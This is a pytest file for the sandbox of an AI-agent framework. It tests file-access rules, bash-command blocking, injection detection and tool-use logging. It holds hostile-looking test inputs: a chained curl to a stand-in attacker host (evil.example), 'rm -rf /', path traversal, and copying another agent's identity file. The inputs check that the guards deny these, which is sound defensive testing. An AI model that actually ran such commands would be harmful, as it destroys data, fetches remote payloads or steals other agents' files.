"""Tests for A1 mode security functions in core.execution.engines.claude.executor."""
# AnimaWorks - Digital Anima Framework
# Copyright (C) 2026 AnimaWorks Authors
# SPDX-License-Identifier: Apache-2.0

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from core.config.global_permissions import GlobalPermissionsCache
from core.execution.engines.claude._sdk_hooks import _collect_all_subordinates
from core.execution.engines.claude._sdk_security import (
    _PROTECTED_FILES,
    _WRITE_COMMANDS,
    _check_a1_bash_command,
    _check_a1_file_access,
)
from core.execution.engines.claude._sdk_stream import (
    _log_tool_use,
    _sanitise_tool_args,
    _summarise_tool_input,
)
from core.paths import PROJECT_DIR


@pytest.fixture(autouse=True)
def _load_global_permissions(tmp_path: Path) -> None:
    src = PROJECT_DIR / "templates" / "_shared" / "config_defaults" / "permissions.global.json"
    dst = tmp_path / "permissions.global.json"
    shutil.copyfile(src, dst)
    GlobalPermissionsCache.reset()
    GlobalPermissionsCache.get().load(dst, interactive=False)
    yield
    GlobalPermissionsCache.reset()


# ── Fixtures ──────────────────────────────────────────────────


@pytest.fixture
def animas_dir(tmp_path: Path) -> Path:
    d = tmp_path / "animas"
    d.mkdir()
    return d


@pytest.fixture
def anima_dir(animas_dir: Path) -> Path:
    d = animas_dir / "test-anima"
    d.mkdir()
    (d / "permissions.md").write_text("", encoding="utf-8")
    (d / "IDENTITY.md").write_text("", encoding="utf-8")
    (d / "BOOTSTRAP.md").write_text("", encoding="utf-8")
    (d / "knowledge").mkdir()
    return d


@pytest.fixture
def other_anima_dir(animas_dir: Path) -> Path:
    d = animas_dir / "other-anima"
    d.mkdir()
    (d / "IDENTITY.md").write_text("secret", encoding="utf-8")
    (d / "episodes").mkdir()
    return d


# ── Constants ──────────────────────────────────────────────────


class TestConstants:
    def test_protected_files_contains_expected(self):
        assert "permissions.md" in _PROTECTED_FILES
        assert "IDENTITY.md" in _PROTECTED_FILES
        assert "SOUL.md" in _PROTECTED_FILES
        assert "AGENTS.md" in _PROTECTED_FILES
        assert "BOOTSTRAP.md" in _PROTECTED_FILES
        assert "identity.md" in _PROTECTED_FILES
        assert "injection.md" in _PROTECTED_FILES
        assert "status.json" in _PROTECTED_FILES

    def test_protected_files_is_frozenset(self):
        assert isinstance(_PROTECTED_FILES, frozenset)

    def test_write_commands_contains_expected(self):
        assert "cp" in _WRITE_COMMANDS
        assert "mv" in _WRITE_COMMANDS
        assert "rsync" in _WRITE_COMMANDS


# ── _check_a1_file_access ────────────────────────────────────


class TestCheckA1FileAccess:
    def test_empty_path_allowed(self, anima_dir: Path):
        assert _check_a1_file_access("", anima_dir, write=True) is None

    def test_write_to_own_permissions_blocked(self, anima_dir: Path):
        path = str(anima_dir / "permissions.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is not None
        assert "protected file" in result

    def test_write_to_own_identity_blocked(self, anima_dir: Path):
        """IDENTITY.md is protected — the profile baseline stays fixed."""
        path = str(anima_dir / "IDENTITY.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is not None
        assert "protected file" in result

    @pytest.mark.parametrize(
        "name",
        ["IDENTITY.md", "identity.MD", "SOUL.md", "soul.md", "AGENTS.md", "agents.Md", "injection.md"],
    )
    def test_protected_write_names_are_case_insensitive_and_include_legacy(self, anima_dir: Path, name: str):
        result = _check_a1_file_access(str(anima_dir / name), anima_dir, write=True)
        assert result is not None
        assert "protected file" in result

    def test_write_to_own_bootstrap_blocked(self, anima_dir: Path):
        path = str(anima_dir / "BOOTSTRAP.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is not None
        assert "protected file" in result

    def test_write_to_own_status_blocked_but_read_allowed(self, anima_dir: Path):
        path = str(anima_dir / "status.json")
        assert _check_a1_file_access(path, anima_dir, write=True) is not None
        assert _check_a1_file_access(path, anima_dir, write=False) is None

    def test_read_own_permissions_allowed(self, anima_dir: Path):
        """Reading protected files should be allowed."""
        path = str(anima_dir / "permissions.md")
        result = _check_a1_file_access(path, anima_dir, write=False)
        assert result is None

    def test_write_to_own_knowledge_allowed(self, anima_dir: Path):
        path = str(anima_dir / "knowledge" / "note.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is None

    def test_write_respects_file_roots_and_readonly_roots(
        self,
        anima_dir: Path,
        monkeypatch: pytest.MonkeyPatch,
        tmp_path: Path,
    ):
        data_dir = tmp_path / "isolated-data"
        data_dir.mkdir()
        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(data_dir))
        system_tmp = tmp_path / "system-tmp"
        system_tmp.mkdir()
        monkeypatch.setattr("tempfile.gettempdir", lambda: str(system_tmp))

        roots_parent = tmp_path.parent
        allowed_root = roots_parent / f"{tmp_path.name}-allowed"
        readonly_root = roots_parent / f"{tmp_path.name}-readonly"
        outside_root = roots_parent / f"{tmp_path.name}-outside"
        (anima_dir / "permissions.json").write_text(
            json.dumps(
                {
                    "file_roots": [str(allowed_root)],
                    "file_roots_readonly": [str(readonly_root)],
                    "file_roots_denied": [],
                }
            ),
            encoding="utf-8",
        )

        assert _check_a1_file_access(str(allowed_root / "new.md"), anima_dir, write=True) is None
        assert _check_a1_file_access(str(anima_dir / "knowledge" / "new.md"), anima_dir, write=True) is None
        readonly_denial = _check_a1_file_access(str(readonly_root / "new.md"), anima_dir, write=True)
        outside_denial = _check_a1_file_access(str(outside_root / "new.md"), anima_dir, write=True)
        assert readonly_denial is not None and "read-only" in readonly_denial
        assert outside_denial is not None and "outside configured file roots" in outside_denial

        workspace = roots_parent / f"{tmp_path.name}-workspace"
        assert _check_a1_file_access(str(workspace / "a.py"), anima_dir, write=True) is not None
        assert _check_a1_file_access(str(workspace / "a.py"), anima_dir, write=True, task_cwd=workspace) is None
        assert _check_a1_file_access(str(system_tmp / "scratch.txt"), anima_dir, write=True) is None
        common_knowledge = data_dir / "common_knowledge"
        monkeypatch.setattr("core.paths.get_common_knowledge_dir", lambda: common_knowledge)
        assert _check_a1_file_access(str(common_knowledge / "operations" / "holds.md"), anima_dir, write=True) is None

    def test_write_to_internal_cache_blocked_when_file_deny_is_configured(
        self,
        anima_dir: Path,
    ):
        (anima_dir / "permissions.json").write_text(
            json.dumps({"file_roots": ["/"], "file_roots_denied": ["/sensitive"]}),
            encoding="utf-8",
        )

        result = _check_a1_file_access(str(anima_dir / ".codex_home" / "config"), anima_dir, write=True)

        assert result is not None
        assert "internal runtime cache" in result

    def test_read_other_anima_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        path = str(other_anima_dir / "IDENTITY.md")
        result = _check_a1_file_access(path, anima_dir, write=False)
        assert result is not None
        assert "other anima" in result.lower()

    def test_write_other_anima_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        path = str(other_anima_dir / "episodes" / "log.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is not None
        assert "other anima" in result.lower()

    def test_path_outside_animas_root_allowed(self, anima_dir: Path):
        """Paths outside the animas/ root are not restricted by this function."""
        result = _check_a1_file_access("/tmp/some_file.txt", anima_dir, write=True)
        assert result is None

    def test_write_permissions_global_json_blocked(
        self,
        anima_dir: Path,
        monkeypatch: pytest.MonkeyPatch,
        tmp_path: Path,
    ):
        from core.paths import get_data_dir

        isolated = tmp_path / "data"
        isolated.mkdir()
        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(isolated))
        p = get_data_dir() / "permissions.global.json"
        p.write_text("{}", encoding="utf-8")
        result = _check_a1_file_access(str(p), anima_dir, write=True)
        assert result is not None
        assert "permissions.global.json" in result

    def test_write_to_own_heartbeat_allowed(self, anima_dir: Path):
        """HEARTBEAT.md is not protected."""
        path = str(anima_dir / "HEARTBEAT.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is None

    def test_write_to_own_cron_allowed(self, anima_dir: Path):
        """cron.md is not protected."""
        path = str(anima_dir / "cron.md")
        result = _check_a1_file_access(path, anima_dir, write=True)
        assert result is None

    # ── subordinate_management_files (direct subordinate r/w) ──

    def test_read_subordinate_injection_via_mgmt(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        """Supervisor can read direct subordinate's AGENTS.md."""
        mgmt = [other_anima_dir / "AGENTS.md"]
        path = str(other_anima_dir / "AGENTS.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=False,
            subordinate_management_files=mgmt,
        )
        assert result is None

    def test_write_subordinate_injection_via_mgmt(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        """Supervisor can write direct subordinate's AGENTS.md."""
        mgmt = [other_anima_dir / "AGENTS.md"]
        path = str(other_anima_dir / "AGENTS.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=True,
            subordinate_management_files=mgmt,
        )
        assert result is None

    def test_read_subordinate_status_via_mgmt(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        mgmt = [other_anima_dir / "status.json"]
        path = str(other_anima_dir / "status.json")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=False,
            subordinate_management_files=mgmt,
        )
        assert result is None

    # ── descendant_read_files (read-only) ──

    def test_read_descendant_identity_allowed(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        desc_read = [other_anima_dir / "IDENTITY.md"]
        path = str(other_anima_dir / "IDENTITY.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=False,
            descendant_read_files=desc_read,
        )
        assert result is None

    def test_write_descendant_identity_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        """descendant_read_files should NOT grant write access."""
        desc_read = [other_anima_dir / "IDENTITY.md"]
        path = str(other_anima_dir / "IDENTITY.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=True,
            descendant_read_files=desc_read,
        )
        assert result is not None

    def test_read_descendant_injection_allowed(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        desc_read = [other_anima_dir / "AGENTS.md"]
        path = str(other_anima_dir / "AGENTS.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=False,
            descendant_read_files=desc_read,
        )
        assert result is None

    # ── descendant_read_dirs (read-only directory) ──

    def test_read_descendant_plans_dir_allowed(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        plans_dir = other_anima_dir / "state" / "plans"
        plans_dir.mkdir(parents=True, exist_ok=True)
        path = str(plans_dir / "plan.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=False,
            descendant_read_dirs=[plans_dir],
        )
        assert result is None

    def test_write_descendant_plans_dir_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        plans_dir = other_anima_dir / "state" / "plans"
        plans_dir.mkdir(parents=True, exist_ok=True)
        path = str(plans_dir / "plan.md")
        result = _check_a1_file_access(
            path,
            anima_dir,
            write=True,
            descendant_read_dirs=[plans_dir],
        )
        assert result is not None

    def test_read_descendant_pending_dir_denied(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        pending_dir = other_anima_dir / "state" / "pending"
        pending_dir.mkdir(parents=True, exist_ok=True)
        path = str(pending_dir / "task_001.json")
        result = _check_a1_file_access(path, anima_dir, write=False, descendant_read_dirs=[])
        assert result is not None


# ── _check_a1_bash_command ───────────────────────────────────


class TestCheckA1BashCommand:
    def test_cp_to_other_anima_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        cmd = f"cp {other_anima_dir}/IDENTITY.md ./stolen.md"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is not None
        assert "other anima" in result.lower()

    def test_mv_to_other_anima_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        cmd = f"mv ./file.md {other_anima_dir}/file.md"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is not None
        assert "other anima" in result.lower()

    def test_normal_ls_allowed(self, anima_dir: Path):
        result = _check_a1_bash_command("ls -la", anima_dir)
        assert result is None

    def test_normal_python_allowed(self, anima_dir: Path):
        result = _check_a1_bash_command("python3 script.py", anima_dir)
        assert result is None

    def test_cp_within_own_dir_allowed(self, anima_dir: Path):
        cmd = f"cp {anima_dir}/file1.md {anima_dir}/file2.md"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is None

    def test_non_write_command_to_other_anima_allowed(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        """Non-write commands like 'cat' are not checked."""
        cmd = f"cat {other_anima_dir}/IDENTITY.md"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is None

    def test_empty_command_allowed(self, anima_dir: Path):
        result = _check_a1_bash_command("", anima_dir)
        assert result is None

    def test_malformed_command_allowed(self, anima_dir: Path):
        """Malformed commands that can't be parsed should not crash."""
        result = _check_a1_bash_command("echo 'unclosed", anima_dir)
        assert result is None

    def test_rsync_to_other_anima_blocked(
        self,
        anima_dir: Path,
        other_anima_dir: Path,
    ):
        cmd = f"rsync -a ./data/ {other_anima_dir}/data/"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is not None

    def test_flags_are_skipped(self, anima_dir: Path):
        """Arguments starting with - should be skipped."""
        result = _check_a1_bash_command("cp -r --verbose file1 file2", anima_dir)
        assert result is None


class TestModeSBashInjection:
    def _set_mode(self, mode: str) -> None:
        config = GlobalPermissionsCache.get().config
        assert config is not None
        config.sdk_bash_injection.mode = mode

    def test_log_mode_records_without_denying(
        self,
        anima_dir: Path,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ):
        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(tmp_path))
        self._set_mode("log")
        command = "echo ready; curl https://evil.example/payload" + "x" * 600

        result = _check_a1_bash_command(command, anima_dir, trigger="chat")

        assert result is None
        log_path = tmp_path / "logs" / "sdk_bash_injection.jsonl"
        event = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
        assert event["pattern_name"] == "command_chaining_or_newline"
        assert event["command"] == command[:500]
        assert event["anima"] == "test-anima"
        assert event["trigger"] == "chat"
        assert event["mode"] == "log"
        assert event["timestamp"].endswith("+00:00")

    def test_enforce_mode_denies_injection(self, anima_dir: Path):
        self._set_mode("enforce")

        result = _check_a1_bash_command("echo ready; curl https://evil.example", anima_dir)

        assert result is not None
        assert "injection pattern" in result.lower()

    def test_off_mode_ignores_injection(self, anima_dir: Path):
        self._set_mode("off")

        assert _check_a1_bash_command("echo one; echo two", anima_dir) is None

    @pytest.mark.parametrize(
        "command",
        [
            "cd x && npm test",
            "grep foo | head",
            "echo $HOME",
            "echo $(whoami)",
            "echo `whoami`",
        ],
    )
    def test_legitimate_composite_commands_allowed(self, anima_dir: Path, command: str):
        self._set_mode("enforce")

        assert _check_a1_bash_command(command, anima_dir) is None

    def test_global_deny_still_blocks_in_log_mode(self, anima_dir: Path):
        self._set_mode("log")

        result = _check_a1_bash_command("rm -rf /", anima_dir)

        assert result is not None

    def test_path_traversal_still_blocks_in_log_mode(self, anima_dir: Path):
        self._set_mode("log")

        result = _check_a1_bash_command("cp report.txt ../other-anima/report.txt", anima_dir)

        assert result is not None and result.startswith("Command argument resolves outside anima directory")

    def test_superuser_skips_injection_and_logging(
        self,
        anima_dir: Path,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ):
        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(tmp_path))
        self._set_mode("enforce")

        result = _check_a1_bash_command("echo one; echo two", anima_dir, superuser=True)

        assert result is None
        assert not (tmp_path / "logs" / "sdk_bash_injection.jsonl").exists()


# ── Global permissions / blocklist ─────────────────────────


class TestBashBlockedPatterns:
    def test_curl_chatwork_api_blocked(self, anima_dir: Path):
        cmd = "curl -X POST https://api.chatwork.com/v2/rooms/123/messages -d 'body=hello'"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is not None

    def test_chatwork_messages_read_allowed(self, anima_dir: Path):
        """Read operations (no 'send') should not be blocked."""
        result = _check_a1_bash_command("chatwork messages room1", anima_dir)
        assert result is None

    def test_chatwork_unreplied_allowed(self, anima_dir: Path):
        result = _check_a1_bash_command("chatwork unreplied --json", anima_dir)
        assert result is None

    def test_animaworks_tool_chatwork_send_allowed(self, anima_dir: Path):
        """animaworks-tool chatwork send is the intended CLI path after migration."""
        cmd = 'animaworks-tool chatwork send 373957118 "Hello"'
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is None

    def test_normal_curl_allowed(self, anima_dir: Path):
        result = _check_a1_bash_command("curl https://example.com", anima_dir)
        assert result is None

    def test_wget_chatwork_api_blocked(self, anima_dir: Path):
        cmd = "wget --post-data='body=hello' https://api.chatwork.com/v2/rooms/123/messages"
        result = _check_a1_bash_command(cmd, anima_dir)
        assert result is not None
        assert "wget" in result

    def test_global_blocked_patterns_nonempty(self):
        assert len(GlobalPermissionsCache.get().blocked_patterns) >= 2


# ── _summarise_tool_input ───────────────────────────────────


class TestSummariseToolInput:
    def test_bash_returns_command(self):
        result = _summarise_tool_input("Bash", {"command": "ls -la"})
        assert result == "ls -la"

    def test_bash_truncates_long_command(self):
        long_cmd = "x" * 500
        result = _summarise_tool_input("Bash", {"command": long_cmd})
        assert len(result) <= 300

    def test_read_returns_file_path(self):
        result = _summarise_tool_input("Read", {"file_path": "/tmp/foo"})
        assert result == "/tmp/foo"

    def test_grep_returns_pattern(self):
        result = _summarise_tool_input("Grep", {"pattern": "hello"})
        assert result == "hello"

    def test_glob_returns_pattern(self):
        result = _summarise_tool_input("Glob", {"pattern": "*.py"})
        assert result == "*.py"

    def test_empty_bash_command(self):
        result = _summarise_tool_input("Bash", {})
        assert result == "(empty)"


# ── _log_tool_use ───────────────────────────────────────────


class TestLogToolUse:
    def test_log_creates_activity_entry(self, tmp_path: Path):
        anima_dir = tmp_path / "animas" / "test-anima"
        anima_dir.mkdir(parents=True)
        (anima_dir / "activity_log").mkdir()

        _log_tool_use(anima_dir, "Bash", {"command": "ls -la"})

        log_files = list((anima_dir / "activity_log").glob("*.jsonl"))
        assert len(log_files) == 1
        entries = [json.loads(line) for line in log_files[0].read_text().strip().split("\n")]
        assert len(entries) == 1
        assert entries[0]["type"] == "tool_use"
        assert entries[0]["tool"] == "Bash"

    def test_log_blocked_includes_meta(self, tmp_path: Path):
        anima_dir = tmp_path / "animas" / "test-anima"
        anima_dir.mkdir(parents=True)
        (anima_dir / "activity_log").mkdir()

        _log_tool_use(anima_dir, "Bash", {"command": "chatwork send"}, blocked=True, block_reason="test")

        log_files = list((anima_dir / "activity_log").glob("*.jsonl"))
        entries = [json.loads(line) for line in log_files[0].read_text().strip().split("\n")]
        assert entries[0]["meta"]["blocked"] is True
        assert entries[0]["meta"]["reason"] == "test"

    def test_log_never_raises(self):
        """Calling with an invalid anima_dir must not raise."""
        _log_tool_use(Path("/nonexistent"), "Bash", {"command": "echo hi"})

    def test_log_write_sanitises_content(self, tmp_path: Path):
        """Write tool content should be stripped, only length kept."""
        anima_dir = tmp_path / "animas" / "test-anima"
        anima_dir.mkdir(parents=True)
        (anima_dir / "activity_log").mkdir()

        big_content = "x" * 10_000
        _log_tool_use(anima_dir, "Write", {"file_path": "/tmp/f.py", "content": big_content})

        log_files = list((anima_dir / "activity_log").glob("*.jsonl"))
        entries = [json.loads(line) for line in log_files[0].read_text().strip().split("\n")]
        args = entries[0]["meta"]["args"]
        assert "content" not in args
        assert args["content_length"] == 10_000
        assert args["file_path"] == "/tmp/f.py"

    def test_log_edit_truncates_strings(self, tmp_path: Path):
        """Edit tool old_string/new_string should be truncated to 200 chars."""
        anima_dir = tmp_path / "animas" / "test-anima"
        anima_dir.mkdir(parents=True)
        (anima_dir / "activity_log").mkdir()

        _log_tool_use(
            anima_dir,
            "Edit",
            {
                "file_path": "/tmp/f.py",
                "old_string": "a" * 500,
                "new_string": "b" * 500,
            },
        )

        log_files = list((anima_dir / "activity_log").glob("*.jsonl"))
        entries = [json.loads(line) for line in log_files[0].read_text().strip().split("\n")]
        args = entries[0]["meta"]["args"]
        assert len(args["old_string"]) == 200
        assert len(args["new_string"]) == 200
        assert args["file_path"] == "/tmp/f.py"


# ── _sanitise_tool_args ──────────────────────────────────


class TestSanitiseToolArgs:
    def test_write_strips_content(self):
        result = _sanitise_tool_args("Write", {"file_path": "/f.py", "content": "x" * 5000})
        assert "content" not in result
        assert result["content_length"] == 5000
        assert result["file_path"] == "/f.py"

    def test_edit_truncates_old_new(self):
        result = _sanitise_tool_args(
            "Edit",
            {
                "file_path": "/f.py",
                "old_string": "a" * 500,
                "new_string": "b" * 500,
            },
        )
        assert len(result["old_string"]) == 200
        assert len(result["new_string"]) == 200

    def test_bash_passthrough(self):
        inp = {"command": "ls -la"}
        result = _sanitise_tool_args("Bash", inp)
        assert result is inp

    def test_read_passthrough(self):
        inp = {"file_path": "/tmp/foo"}
        result = _sanitise_tool_args("Read", inp)
        assert result is inp


# ── _collect_all_subordinates ────────────────────────────────


class _FakeCfg:
    """Minimal stand-in for AnimaModelConfig with a supervisor field."""

    def __init__(self, supervisor: str | None = None):
        self.supervisor = supervisor


class TestCollectAllSubordinates:
    def test_direct_subordinates(self):
        animas = {
            "mio": _FakeCfg("sakura"),
            "yuki": _FakeCfg("mio"),
            "ren": _FakeCfg(None),
        }
        result = _collect_all_subordinates("sakura", animas)
        assert result == {"mio", "yuki"}

    def test_no_subordinates(self):
        animas = {
            "mio": _FakeCfg("sakura"),
            "yuki": _FakeCfg("mio"),
        }
        result = _collect_all_subordinates("yuki", animas)
        assert result == set()

    def test_deep_hierarchy(self):
        animas = {
            "a": _FakeCfg("root"),
            "b": _FakeCfg("a"),
            "c": _FakeCfg("b"),
            "d": _FakeCfg("c"),
        }
        result = _collect_all_subordinates("root", animas)
        assert result == {"a", "b", "c", "d"}

    def test_multiple_branches(self):
        animas = {
            "eng1": _FakeCfg("lead"),
            "eng2": _FakeCfg("lead"),
            "intern": _FakeCfg("eng1"),
        }
        result = _collect_all_subordinates("lead", animas)
        assert result == {"eng1", "eng2", "intern"}

    def test_does_not_include_self(self):
        animas = {
            "sakura": _FakeCfg(None),
            "mio": _FakeCfg("sakura"),
        }
        result = _collect_all_subordinates("sakura", animas)
        assert "sakura" not in result

    def test_circular_reference_does_not_loop(self):
        """Circular supervisor chains should not cause infinite loops."""
        animas = {
            "a": _FakeCfg("b"),
            "b": _FakeCfg("a"),
        }
        # Both end up reachable due to circular chain; key assertion is no hang
        result = _collect_all_subordinates("a", animas)
        assert "b" in result
